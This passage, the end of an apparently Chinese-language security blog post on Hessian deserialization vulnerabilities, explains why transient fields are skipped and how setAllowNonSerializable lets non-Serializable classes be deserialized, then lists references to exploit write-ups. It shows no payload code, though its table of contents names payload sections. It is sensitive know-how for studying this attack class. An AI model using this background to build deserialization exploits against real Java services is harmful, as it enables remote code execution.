<p>在UnsafeSerializer#introspect方法中用于获取对象的属性和字段信息，以便进行序列化操作；若是序列化对象的字段是transienth和static属性则不参加序列化过程</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901142314-qhkqqj7.png" alt="image"></p>
<p>我们可以知道在原始的jdk反序列化中同样也是不会对成员变量修饰符为transient的字段进行序列化操作，那么为什么TemplateImpl类中的_tfactory属性是transient，却可以反序列化呢？</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901142935-zfbnfpc.png" alt="image"></p>
<p>原因是是TemplatesImpl类重写了readObject方法实例化了_tfactory</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901143010-sx4hrzn.png" alt="image"></p>
<h3 id="hessian想要序列化的类不需要实现Serializable序列化接口"><a href="#hessian想要序列化的类不需要实现Serializable序列化接口" class="headerlink" title="hessian想要序列化的类不需要实现Serializable序列化接口"></a>hessian想要序列化的类不需要实现Serializable序列化接口</h3><p>在 Java 原生反序列化中，实现了 java.io.Serializable 接口的类才可以反序列化。Hessian 象征性的支持了这种规范，具体的逻辑如下图，在获取默认序列化器时，判断了类是否实现了 Serializable 接口</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230831165100-3mo9phg.png" alt="image"></p>
<p>但是同时也获取了变量_isAllowNonSerializable的值，该值如果为true的时候就可以直接进行序列化，可直接通过SerializerFactory#setAllowNonSerializable 方法将其设置为 true，从而使未实现 Serializable 接口的类也可以序列化和反序列化。</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230831165624-osqm0xw.png" alt="image"></p>
<h3 id><a href="#" class="headerlink" title></a></h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//exp10it.cn/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/#jndi-ldap-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96--pojonode-%E8%A7%A6%E5%8F%91-templatesimpl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/11961</span></span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="cas反序列化漏洞">
      <i class="fa fa-chevron-left"></i> cas反序列化漏洞
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/01/26/%E9%87%91%E8%9D%B6%E5%A4%A9%E7%87%95%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" rel="next" title="金蝶天燕权限绕过分析">
      金蝶天燕权限绕过分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%861"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞原理1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%862-%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91except%E5%88%B0Tostring%E5%AE%8C%E6%88%90%E8%B0%83%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞原理2-通过触发except到Tostring完成调用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-number">2.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dnslog"><span class="nav-number">2.1.</span> <span class="nav-text">dnslog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI"><span class="nav-number">2.2.</span> <span class="nav-text">JNDI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">文件写入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8webapp%E4%B8%8B%E7%9A%84%E7%B1%BB"><span class="nav-number">2.4.</span> <span class="nav-text">调用webapp下的类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL"><span class="nav-number">2.5.</span> <span class="nav-text">BCEL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.6.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89defineClass"><span class="nav-number">2.7.</span> <span class="nav-text">自定义defineClass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">3.</span> <span class="nav-text">注意事项</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88Hessian%E6%97%A0%E6%B3%95%E8%A7%A6%E5%8F%91TemplatesImpl%E7%B1%BB"><span class="nav-number">3.1.</span> <span class="nav-text">为什么Hessian无法触发TemplatesImpl类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hessian%E6%83%B3%E8%A6%81%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%B1%BB%E4%B8%8D%E9%9C%80%E8%A6%81%E5%AE%9E%E7%8E%B0Serializable%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A5%E5%8F%A3"><span class="nav-number">3.2.</span> <span class="nav-text">hessian想要序列化的类不需要实现Serializable序列化接口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">3.3.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="zad"
      src="/images/touxiang.jpeg">
  <p class="site-author-name" itemprop="name">zad</p>
  <div class="site-description" itemprop="description">不忘初心,方得始终</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Zbadblog" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Zbadblog" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zad</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
